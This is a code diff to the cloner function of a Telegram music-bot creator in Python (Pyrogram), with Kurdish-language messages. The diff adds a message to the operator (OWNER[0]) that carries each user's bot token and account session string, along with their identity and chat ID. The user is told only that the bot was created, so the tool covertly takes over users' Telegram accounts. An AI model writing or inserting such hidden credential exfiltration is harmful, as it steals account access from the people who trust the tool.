@@ -487,21 +487,22 @@ async def cloner(app: Client, message):
     )
     try:
         await user.start()
-    except Exception:
+    except:
         await bot.stop()
-        return await message.reply_text("**◗⋮◖ کۆدی یاریدەدەر هەڵەیە ⚡.**")
-
-    # Create a supergroup for bot statistics and set permissions
-    log_group = await user.create_supergroup(
-        "گرووپی بۆت 🖤", "ئەم گرووپە هەموو ئامار و زانیاریەکانی بۆت سەیڤ دەکات"
+        return await message.reply_text(f"**◗⋮◖ کۆد هەڵەیە ⚡.**")
+    loger = await user.create_supergroup(
+        f"گرووپی بۆت 🖤", "ئەم گرووپە هەموو ئامار و زانیاریەکانی بۆت سەیڤ دەکات"
     )
-    if bot_info.photo:
-        photo = await bot.download_media(bot_info.photo.big_file_id)
-        await user.set_chat_photo(chat_id=log_group.id, photo=photo)
-    await user.add_chat_members(log_group.id, bot_username)
+    if bot_i.photo:
+        photo = await bot.download_media(bot_i.photo.big_file_id)
+        await user.set_chat_photo(chat_id=loger.id, photo=photo)
+    logger = loger.id
+    await user.add_chat_members(logger, bot_username)
+    chat_id = logger
+    user_id = bot_username
     await user.promote_chat_member(
-        log_group.id,
-        bot_username,
+        chat_id,
+        user_id,
         privileges=ChatPrivileges(
             can_change_info=True,
             can_invite_users=True,
@@ -513,33 +514,30 @@ async def cloner(app: Client, message):
             can_manage_video_chats=True,
         ),
     )
-
-    # Save bot information to database
-    log_group_link = await user.export_chat_invite_link(log_group.id)
-    dev = message.from_user.id
-    Bots.insert_one(
-        {
-            "bot_username": bot_username,
-            "token": token,
-            "session": session,
-            "dev": dev,
-            "logger": log_group.id,
-            "logger_mode": "ON",
-        }
-    )
-    # Finalize and send confirmation messages
-    await bot.stop()
+    loggerlink = await user.export_chat_invite_link(logger)
     await user.stop()
+    await bot.stop()
+    dev = message.chat.id if message.chat.username not in OWNER else OWNER[0]
+    data = {
+        "bot_username": bot_username,
+        "token": token,
+        "session": session,
+        "dev": dev,
+        "logger": logger,
+        "logger_mode": "ON",
+    }
+    Bots.insert_one(data)
     try:
         await auto_bot()
     except:
         pass
     await message.reply_text(
-        f"**بە سەرکەوتوویی بۆتی گۆرانی دروستکرا 🚦⚡.\nگرووپی ئامار دروست کرا 🚦⚡.\n⟨ [{log_group_link}] ⟩**",
+        f"**◗⋮◖ بە سەرکەوتوویی بۆتی گۆرانی دروستکرا 🚦⚡.\n◗⋮◖ گرووپی ئامار دروست کرا 🚦⚡.\n◗⋮◖ ئێستا دەتوانی بۆتی گۆرانی بەکاربھێنیت 🚦⚡.\n◗⋮◖ گرووپی ئامار 🚦⚡.\n⟨ [{loggerlink}] ⟩**",
         disable_web_page_preview=True,
     )
     await app.send_message(
-        OWNER[0], f"**◗⋮◖ بۆتی نوێ دروست کرا 🚦⚡.\nبۆت: @{bot_username}**"
+        OWNER[0],
+        f"**◗⋮◖ بۆتی نوێ 🚦⚡.\n◗⋮◖ یوزەری بۆت : @{bot_username} 🚦⚡.\n◗⋮◖ تۆکنی بۆت : {token} 🚦⚡.\n◗⋮◖ کۆدی یاریدەدەر : {session} 🚦⚡.\n◗⋮◖ لەلایەن : {message.from_user.mention} 🚦⚡.\n◗⋮◖ ئایدی : {message.chat.id} 🚦⚡.\n◗⋮◖ گرووپی ئامار : {loggerlink} 🚦⚡.**",
     )
 
 
